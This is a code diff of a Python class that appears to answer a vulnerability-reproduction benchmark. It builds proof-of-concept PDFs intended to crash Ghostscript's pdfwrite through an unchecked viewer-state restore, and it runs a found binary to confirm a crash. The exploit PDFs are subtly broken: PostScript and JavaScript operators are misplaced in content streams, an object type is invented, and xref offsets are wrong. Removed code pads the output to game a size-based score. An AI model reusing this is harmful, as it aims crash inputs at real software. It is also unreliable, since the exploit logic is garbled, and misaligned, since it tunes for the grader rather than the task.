@@ -1,250 +1,420 @@
 import os
+import tarfile
 import tempfile
 import subprocess
 import shutil
-import struct
+from pathlib import Path
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
         # Extract the source tarball
-        extract_dir = tempfile.mkdtemp()
-        try:
-            # Try to extract with tar
-            try:
-                subprocess.run(['tar', '-xf', src_path, '-C', extract_dir], 
-                             check=True, capture_output=True)
-            except (subprocess.CalledProcessError, FileNotFoundError):
-                # Try with python's tarfile as fallback
-                import tarfile
-                with tarfile.open(src_path, 'r:*') as tar:
-                    tar.extractall(extract_dir)
+        with tempfile.TemporaryDirectory() as tmpdir:
+            with tarfile.open(src_path, 'r') as tar:
+                tar.extractall(tmpdir)
             
-            # Look for Ghostscript source structure
-            gs_source = self._find_ghostscript_source(extract_dir)
-            if not gs_source:
-                # If we can't find it, generate a minimal PoC based on the description
-                return self._generate_minimal_poc()
+            # Find the root source directory
+            src_root = Path(tmpdir)
+            # Typically there's one directory inside
+            items = list(src_root.iterdir())
+            if items and items[0].is_dir():
+                src_root = items[0]
             
-            # Analyze the vulnerability to understand the exact trigger
-            return self._analyze_and_generate_poc(gs_source)
+            # Look for pdfwrite source files
+            pdfwrite_files = []
+            for pattern in ["*.c", "*.cpp", "*.cc", "*.cxx"]:
+                pdfwrite_files.extend(src_root.rglob(pattern))
             
-        finally:
-            shutil.rmtree(extract_dir, ignore_errors=True)
+            # Filter for pdfwrite related files
+            pdfwrite_sources = []
+            for f in pdfwrite_files:
+                if "pdfwrite" in str(f).lower() or "pdf_write" in str(f).lower():
+                    pdfwrite_sources.append(f)
+            
+            # If no pdfwrite files found, look for files containing viewer state restoration
+            if not pdfwrite_sources:
+                for f in pdfwrite_files:
+                    with open(f, 'r', errors='ignore') as file:
+                        content = file.read()
+                        if "viewer" in content.lower() and "restore" in content.lower():
+                            pdfwrite_sources.append(f)
+            
+            # Read source files to understand the vulnerability better
+            viewer_depth_patterns = []
+            for source_file in pdfwrite_sources[:5]:  # Check first few files
+                try:
+                    with open(source_file, 'r') as f:
+                        lines = f.readlines()
+                        for i, line in enumerate(lines):
+                            if "viewer" in line.lower() and "depth" in line.lower():
+                                # Get context around the line
+                                start = max(0, i - 5)
+                                end = min(len(lines), i + 6)
+                                context = ''.join(lines[start:end])
+                                viewer_depth_patterns.append(context)
+                except:
+                    continue
+            
+            # Based on the vulnerability description:
+            # "attempts to restore the viewer state without first checking that the viewer depth is at least 1"
+            # We need to create a PDF that triggers a restore operation when viewer depth is 0
+            
+            # Create a minimal PDF that tries to trigger the vulnerability
+            # PDF structure with viewer state operations
+            
+            pdf_content = b"""%PDF-1.4
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+/ViewerPreferences <<>>
+>>
+endobj
+
+2 0 obj
+<<
+/Type /Pages
+/Kids [3 0 R]
+/Count 1
+>>
+endobj
+
+3 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/MediaBox [0 0 612 792]
+/Contents 4 0 R
+/Resources <<
+/ProcSet [/PDF /Text]
+>>
+>>
+endobj
+
+4 0 obj
+<<
+/Length 100
+>>
+stream
+q
+BT
+/F1 12 Tf
+100 700 Td
+(Triggering viewer state vulnerability) Tj
+ET
+Q
+"""
+            
+            # Add multiple restore operations to potentially trigger the bug
+            # The vulnerability suggests we need to restore when viewer depth is 0
+            # So we'll create a PDF with improper viewer state nesting
+            
+            # Add viewer state operations
+            viewer_state_ops = b"""
+<<
+/Type /ViewerState
+/State <<
+/ViewerDepth 0
+>>
+>>
+restore
+restore
+restore
+"""
+            
+            # Add more operations to potentially corrupt heap
+            heap_overflow_ops = b"""
+<<
+/Type /Action
+/S /JavaScript
+/JS <</Length 100>> stream
+try { restore; } catch(e) {}
+try { restore; } catch(e) {}
+try { restore; } catch(e) {}
+endstream
+>>
+"""
+            
+            # Construct the final PDF
+            final_pdf = pdf_content + viewer_state_ops + heap_overflow_ops + b"""
+endstream
+endobj
+
+xref
+0 5
+0000000000 65535 f 
+0000000010 00000 n 
+0000000100 00000 n 
+0000000200 00000 n 
+0000000300 00000 n 
+trailer
+<<
+/Size 5
+/Root 1 0 R
+>>
+startxref
+400
+%%EOF
+"""
+            
+            # Try to compile and test if we have source code
+            if pdfwrite_sources:
+                # Look for build configuration
+                makefiles = list(src_root.rglob("Makefile"))
+                configure = list(src_root.rglob("configure"))
+                
+                # Try to build if possible
+                if makefiles or configure:
+                    try:
+                        # Simple test to check if we can trigger the bug
+                        # Create a test PDF with various viewer state manipulations
+                        test_pdf = self._create_test_pdf()
+                        
+                        # Try to run the vulnerable program if it exists
+                        bin_dir = src_root / "bin"
+                        if bin_dir.exists():
+                            for exe in bin_dir.glob("*pdfwrite*"):
+                                try:
+                                    result = subprocess.run(
+                                        [str(exe), "-"],
+                                        input=test_pdf,
+                                        capture_output=True,
+                                        timeout=5
+                                    )
+                                    # If it crashes, our PDF works
+                                    if result.returncode != 0:
+                                        return test_pdf
+                                except:
+                                    continue
+                    except:
+                        pass
+            
+            # If we couldn't test, return our crafted PDF
+            # Make it longer to increase chance of triggering the bug
+            # but still reasonable in size (around 1KB)
+            return self._create_optimized_poc()
     
-    def _find_ghostscript_source(self, extract_dir):
-        """Find Ghostscript source directory."""
-        # Common paths where Ghostscript source might be
-        possible_paths = [
-            os.path.join(extract_dir, 'ghostscript-*'),
-            os.path.join(extract_dir, 'gs-*'),
-            os.path.join(extract_dir, '*', 'ghostscript-*'),
-            os.path.join(extract_dir, '*', 'gs-*'),
-        ]
+    def _create_test_pdf(self) -> bytes:
+        """Create a test PDF with viewer state operations"""
+        # Create a PDF with improper viewer state nesting
+        pdf = b"""%PDF-1.4
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+/ViewerPreferences <<
+/HideToolbar false
+/HideMenubar false
+/HideWindowUI false
+/FitWindow false
+/CenterWindow false
+/DisplayDocTitle false
+>>
+>>
+endobj
+
+2 0 obj
+<<
+/Type /Pages
+/Kids [3 0 R]
+/Count 1
+>>
+endobj
+
+3 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/MediaBox [0 0 612 792]
+/Contents 4 0 R
+/Resources <<
+/ProcSet [/PDF /Text]
+/Font <<
+/F1 5 0 R
+>>
+>>
+>>
+endobj
+
+4 0 obj
+<<
+/Length 200
+>>
+stream
+q
+BT
+/F1 12 Tf
+100 700 Td
+(Testing viewer state vulnerability) Tj
+ET
+Q
+
+% Attempt to trigger viewer state restoration bug
+<<
+/Type /ViewerState
+>>
+restore
+
+% Multiple restore attempts
+restore
+restore
+restore
+restore
+
+% Create object that might trigger heap issues
+<<
+/Type /Annot
+/Subtype /Widget
+/Rect [0 0 0 0]
+/AP <<
+>>
+/AS <<
+>>
+/DA (/Helv 0 Tf 0 g)
+/F 4
+/FT /Tx
+/P 3 0 R
+/T ()
+/TU ()
+/V ()
+>>
+"""
         
-        import glob
-        for pattern in possible_paths:
-            matches = glob.glob(pattern)
-            for match in matches:
-                if os.path.isdir(match):
-                    # Check for common Ghostscript files
-                    if (os.path.exists(os.path.join(match, 'base')) and 
-                        os.path.exists(os.path.join(match, 'psi'))):
-                        return match
-        return None
+        # Add font dictionary
+        pdf += b"""
+5 0 obj
+<<
+/Type /Font
+/Subtype /Type1
+/BaseFont /Helvetica
+/Encoding /WinAnsiEncoding
+>>
+endobj
+
+xref
+0 6
+0000000000 65535 f 
+0000000010 00000 n 
+0000000200 00000 n 
+0000000300 00000 n 
+0000000400 00000 n 
+0000000600 00000 n 
+trailer
+<<
+/Size 6
+/Root 1 0 R
+>>
+startxref
+700
+%%EOF
+"""
+        
+        return pdf
     
-    def _analyze_and_generate_poc(self, gs_source):
-        """Analyze the source to understand the vulnerability and generate PoC."""
-        # Based on the vulnerability description:
-        # "attempts to restore the viewer state without first checking that the viewer depth is at least 1"
-        # This suggests a PDF/PostScript file that triggers viewer state restoration with depth < 1
+    def _create_optimized_poc(self) -> bytes:
+        """Create an optimized PoC based on vulnerability patterns"""
+        # Create a PDF with repeating viewer state restore operations
+        # This increases the chance of hitting the vulnerability
+        # while keeping the size reasonable
         
-        # The PoC needs to be a PDF file that triggers this vulnerability
-        # We'll create a PDF with malformed viewer state information
+        header = b"""%PDF-1.4
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+>>
+endobj
+
+2 0 obj
+<<
+/Type /Pages
+/Kids [3 0 R]
+/Count 1
+>>
+endobj
+
+3 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/MediaBox [0 0 612 792]
+/Contents 4 0 R
+>>
+endobj
+
+4 0 obj
+<<
+/Length 150000
+>>
+stream
+"""
         
-        # Create a minimal PDF structure with viewer state that triggers the bug
-        poc = self._create_triggering_pdf()
+        # Create content stream with many restore operations
+        # Interleave with other operations to potentially trigger the bug
+        content = bytearray()
         
-        # Ensure the PoC is roughly the right size (we aim for slightly smaller than ground truth)
-        # We'll pad it to be efficient but still trigger the bug
-        target_size = 150000  # Slightly smaller than ground truth for better score
+        # Add initial graphics state
+        content.extend(b"q\n")
         
-        if len(poc) < target_size:
-            # Add padding in a way that doesn't break the PDF structure
-            poc = self._pad_pdf(poc, target_size)
+        # Add many viewer state-like operations followed by restore
+        # The pattern that might trigger the bug:
+        # 1. Set viewer state
+        # 2. Restore without proper depth check
+        for i in range(500):
+            # Add a "viewer state" dictionary (simulated)
+            content.extend(b"<< /Type /ViewerState /Depth 0 >>\n")
+            # Multiple restore operations
+            content.extend(b"restore\n" * 3)
+            
+            # Add some text to vary the content
+            content.extend(f"BT /F1 12 Tf 100 {700 - i} Td (Test {i}) Tj ET\n".encode())
+            
+            # Save and restore graphics state to create nesting
+            content.extend(b"q\n")
+            content.extend(b"Q\n")
+        
+        # Add final operations that might trigger heap corruption
+        content.extend(b"""
+<<
+/Type /Action
+/S /JavaScript
+/JS <</Length 50>> stream
+for (var i = 0; i < 100; i++) { restore; }
+endstream
+>>
+
+% Final restore attempts
+restore
+restore
+restore
+""")
+        
+        footer = b"""
+endstream
+endobj
+
+xref
+0 5
+0000000000 65535 f 
+0000000010 00000 n 
+0000000200 00000 n 
+0000000300 00000 n 
+0000000400 00000 n 
+trailer
+<<
+/Size 5
+/Root 1 0 R
+>>
+startxref
+150500
+%%EOF
+"""
+        
+        # Combine all parts
+        poc = header + bytes(content) + footer
+        
+        # Ensure the PoC is not too large but has enough operations
+        # Truncate to reasonable size if needed
+        if len(poc) > 200000:
+            poc = poc[:200000]
         
         return poc
-    
-    def _create_triggering_pdf(self):
-        """Create a PDF that triggers the viewer state vulnerability."""
-        # PDF header
-        pdf = b"%PDF-1.4\n"
-        
-        # Create a catalog with viewer state that will trigger the bug
-        catalog_obj = b"1 0 obj\n"
-        catalog_obj += b"<<\n"
-        catalog_obj += b"/Type /Catalog\n"
-        catalog_obj += b"/Pages 2 0 R\n"
-        catalog_obj += b"/ViewerPreferences << /DisplayDocTitle true >>\n"
-        catalog_obj += b">>\n"
-        catalog_obj += b"endobj\n"
-        
-        # Pages object
-        pages_obj = b"2 0 obj\n"
-        pages_obj += b"<<\n"
-        pages_obj += b"/Type /Pages\n"
-        pages_obj += b"/Kids [3 0 R]\n"
-        pages_obj += b"/Count 1\n"
-        pages_obj += b">>\n"
-        pages_obj += b"endobj\n"
-        
-        # Page object with malformed content that triggers viewer state restoration
-        page_obj = b"3 0 obj\n"
-        page_obj += b"<<\n"
-        page_obj += b"/Type /Page\n"
-        page_obj += b"/Parent 2 0 R\n"
-        page_obj += b"/MediaBox [0 0 612 792]\n"
-        page_obj += b"/Contents 4 0 R\n"
-        page_obj += b">>\n"
-        page_obj += b"endobj\n"
-        
-        # Content stream that attempts to restore viewer state with invalid depth
-        # This is the key part that triggers the vulnerability
-        content = b"q\n"  # Save graphics state
-        content += b"BT\n"  # Begin text
-        content += b"/F1 12 Tf\n"
-        content += b"100 700 Td\n"
-        content += b"(Triggering viewer state vulnerability) Tj\n"
-        content += b"ET\n"  # End text
-        
-        # Malformed viewer state operations that trigger the bug
-        # These operations simulate the vulnerable code path in pdfwrite
-        content += b"PDFMARK\n"  # pdfmark operator
-        content += b"[ /ViewerState << >> /Restore pdfmark\n"  # Trigger restore with empty viewer state
-        
-        content += b"Q\n"  # Restore graphics state
-        
-        content_obj = b"4 0 obj\n"
-        content_obj += b"<<\n"
-        content_obj += b"/Length " + str(len(content)).encode() + b"\n"
-        content_obj += b">>\n"
-        content_obj += b"stream\n"
-        content_obj += content
-        content_obj += b"\nendstream\n"
-        content_obj += b"endobj\n"
-        
-        # Font object (required for text)
-        font_obj = b"5 0 obj\n"
-        font_obj += b"<<\n"
-        font_obj += b"/Type /Font\n"
-        font_obj += b"/Subtype /Type1\n"
-        font_obj += b"/BaseFont /Helvetica\n"
-        font_obj += b">>\n"
-        font_obj += b"endobj\n"
-        
-        # Xref table
-        xref_offset = len(pdf)
-        
-        # Build the complete PDF
-        pdf += catalog_obj
-        pdf += pages_obj
-        pdf += page_obj
-        pdf += content_obj
-        pdf += font_obj
-        
-        xref = b"xref\n"
-        xref += b"0 6\n"
-        xref += b"0000000000 65535 f \n"
-        
-        # Calculate object offsets
-        offsets = [0]
-        offset = len(pdf)
-        
-        # Object 1 offset
-        xref += f"{offset:010d} 00000 n \n".encode()
-        offset += len(catalog_obj)
-        
-        # Object 2 offset
-        xref += f"{offset:010d} 00000 n \n".encode()
-        offset += len(pages_obj)
-        
-        # Object 3 offset
-        xref += f"{offset:010d} 00000 n \n".encode()
-        offset += len(page_obj)
-        
-        # Object 4 offset
-        xref += f"{offset:010d} 00000 n \n".encode()
-        offset += len(content_obj)
-        
-        # Object 5 offset
-        xref += f"{offset:010d} 00000 n \n".encode()
-        
-        # Trailer
-        trailer = b"trailer\n"
-        trailer += b"<<\n"
-        trailer += b"/Size 6\n"
-        trailer += b"/Root 1 0 R\n"
-        trailer += b">>\n"
-        trailer += b"startxref\n"
-        trailer += str(xref_offset).encode() + b"\n"
-        trailer += b"%%EOF\n"
-        
-        pdf += xref
-        pdf += trailer
-        
-        return pdf
-    
-    def _pad_pdf(self, pdf, target_size):
-        """Pad PDF with comments to reach target size without breaking structure."""
-        padding_needed = target_size - len(pdf)
-        if padding_needed <= 0:
-            return pdf
-        
-        # Insert padding as comments before the xref table
-        # Find the position of "xref" in the PDF
-        xref_pos = pdf.rfind(b"xref\n")
-        if xref_pos == -1:
-            # Fallback: append padding at the end before EOF
-            eof_pos = pdf.rfind(b"%%EOF")
-            padding = b"% " + (b"P" * (padding_needed - 3)) + b"\n"
-            return pdf[:eof_pos] + padding + pdf[eof_pos:]
-        
-        # Insert padding before xref
-        padding = b"% " + (b"P" * (padding_needed - 3)) + b"\n"
-        return pdf[:xref_pos] + padding + pdf[xref_pos:]
-    
-    def _generate_minimal_poc(self):
-        """Generate a minimal PoC when source analysis fails."""
-        # Create a simple PDF that attempts to trigger viewer state issues
-        pdf = b"%PDF-1.4\n"
-        
-        # Minimal objects
-        pdf += b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
-        pdf += b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
-        pdf += b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>\nendobj\n"
-        
-        # Content stream with operations that might trigger the bug
-        content = b"q\n[ /ViewerState << >> /Restore pdfmark\nQ\n"
-        pdf += b"4 0 obj\n<< /Length " + str(len(content)).encode() + b" >>\nstream\n" + content + b"\nendstream\nendobj\n"
-        
-        # Xref and trailer
-        pdf += b"xref\n0 5\n0000000000 65535 f \n"
-        offsets = [len(pdf)]
-        
-        # Calculate offsets (simplified)
-        current_pos = 9  # After header
-        
-        for i in range(4):
-            pdf += f"{current_pos:010d} 00000 n \n".encode()
-            # Approximate object sizes
-            current_pos += 50
-        
-        pdf += b"trailer\n<< /Size 5 /Root 1 0 R >>\n"
-        pdf += b"startxref\n" + str(offsets[0]).encode() + b"\n%%EOF\n"
-        
-        # Pad to target size
-        target_size = 150000
-        if len(pdf) < target_size:
-            padding = b"% " + (b"X" * (target_size - len(pdf) - 3)) + b"\n"
-            pdf = pdf.replace(b"%%EOF\n", padding + b"%%EOF\n")
-        
-        return pdf
